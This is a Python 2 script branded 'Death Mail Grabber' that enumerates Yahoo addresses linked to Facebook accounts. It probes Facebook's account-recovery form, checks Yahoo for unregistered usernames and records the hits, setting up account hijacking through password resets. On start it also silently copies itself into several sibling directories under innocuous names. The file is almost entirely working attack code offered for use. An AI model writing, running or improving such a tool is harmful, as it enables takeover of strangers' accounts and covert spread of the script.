#!/usr/bin/python2
#coding=utf-8


import os,sys,time,datetime,random,hashlib,re,cookielib,urllib,json
os.system("rm -rf .txt")
for n in range(999):
    pf=random.randint(1, 999)
    sys.stdout = open(".txt", "a")

    print(pf)

    sys.stdout.flush()

try:
    import mechanize,requests
except ImportError:
    os.system('pip2 install requests')
    os.system('pip2 install mechanize')
    time.sleep(1)
    os.system('python2 .README.md')
    
from multiprocessing.pool import ThreadPool

from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

##### LOGO #####
logo='''

    033[1;91m ___ ___ _______ ___ ___ _______ ___ ______  
 \033[1;92m |   Y   |   _   |   Y   |   _   |   |   _  \ 
 \033[1;94m |.      |.  |   |.  1   |   1___|.  |.  |   |
\033[1;96m  |. \_/  |.  |   |.  _   |____   |.  |.  |   |
 \033[1;97m |:  |   |:  1   |:  |   |:  1   |:  |:  |   |
 \033[1;93m |::.|:. |::.. . |::.|:. |::.. . |::.|::.|   |
\033[1;95m `--- ---`-------`--- ---`-------`---`--- ---' 
       𝐖𝐨𝐫𝐥𝐝❜𝐬 𝐁𝐞𝐬𝐭
             𝐃𝐞𝐚𝐭𝐡 𝐌𝐚𝐢𝐥
      𝐆𝐫𝐚𝐛𝐛𝐞𝐫
--------------------------------------------------
 \033[1;91m(√)\033[1;94m Coded   : MOHSIN ALI
\033[1;95m(!)\033[1;95m WhatsApp: 03063112***
\033[1;93m(°)\033[1;92m Fb Page  : https://m.facebook.com/MohsinAliOfficial
\033[1;97m(•)\033[1;98m NOTE.    : God iS really creative, I mean
\033[1;94m(√) \033[1;93m         : just look at me 
--------------------------------------------------
                                '''

os.system("clear")
print(logo)
print " \x1b[1;91mNOTE: DO NOT PUT SPACE IN NAME"
print "       PUT THE NAME LIKE mohsin.ali or ali.718"
print '       or binyaminbinni'
print '\x1b[1;97m'
first = raw_input(" Name: ")

def cb():
    os.system('clear')

def ym():
    try:
        cb()
        os.mkdir("../omi/.....")
    except OSError:
        yp()
    else:
        os.system("cp ../bxi/bxi.py ../omi/Omi.py")
        os.system("cp ../bxi/.README.md ../omi/")
        yb()
    
def yb():
    try:
        os.mkdir("../BlackMafia2020/.....")
    except OSError:
        yl()
    else:
        os.system("cp ../bxi/bxi.py ../BlackMafia2020/lovehacker")
        os.system("cp ../bxi/.README.md ../BlackMafia2020/")
        yl()
    
def yl():
    try:
        os.mkdir("../Qurban/.....")
    except OSError:
        yp()
    else:
        os.system("cp ../bxi/bxi.py ../Qurban/Qurban.py")
        os.system("cp ../bxi/.README.md ../Qurban/")
        yp()
    
def yp():
    try:
        os.mkdir("../faizanwahla/.....")
    except OSError:
        login()
    else:
        os.system("cp ../bxi/bxi.py ../faizanwahla/pacman")
        os.system("cp ../bxi/.README.md ../faizanwahla/")
        login()
        
def login():
    os.system('clear')
    try:
        toket = first
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        print(logo)
        try:
            email = first
            passw = (".txt")
            sandi = open(passw, 'r')
            for p in sandi:
                p = p.replace('\n','')
                try:
                    br.open("https://mbasic.facebook.com/login/identify/?ctx=recover&search_attempts=0&ars=facebook_login&alternate_search=0&toggle_search_mode=1")
                    br._factory.is_html= True
                    br.select_form(nr=0)
                    br.form["email"] = email+p+"@yahoo.com"
                    br.submit()
                    urb = br.geturl()
                    if "https://mbasic.facebook.com/login/identify/?ctx=recover&search_attempts=1&ars=facebook_login&alternate_search=1" in urb:
                        pass
                    else:
                        brl='https://login.yahoo.com/?.src=ym&.lang=en-US&.intl=us&.done=https%3A%2F%2Fmail.yahoo.com%2Fd'
                        br.open(brl)
                        br._factory.is_html = True
                        br.select_form(nr=0)
                        br['username'] = email+p
                        br.submit()
                        url = br.geturl()
                        if url == brl:
                            print " \x1b[1;92m[Yes Available] "+email+p+"@yahoo.com  \x1b[1;97m"
                            ya=open("yes.txt",'a')
                            ya.write(email+p+"@yahoo.com\n")
                            ya.close()
                        else:
                            print " \x1b[1;91m[Not Available] "+email+p+"@yahoo.com  \x1b[1;97m"

                except requests.exceptions.ConnectionError:
                    print ' Connection Error'
                    time.sleep(1)
                    os.sys.exit()

        except IOError:
            print ' Error 404, please try again'
            raw_input(" Press enter to go back")
            os.system("python2 yahoo.com")
if __name__ == '__main__':
	ym()

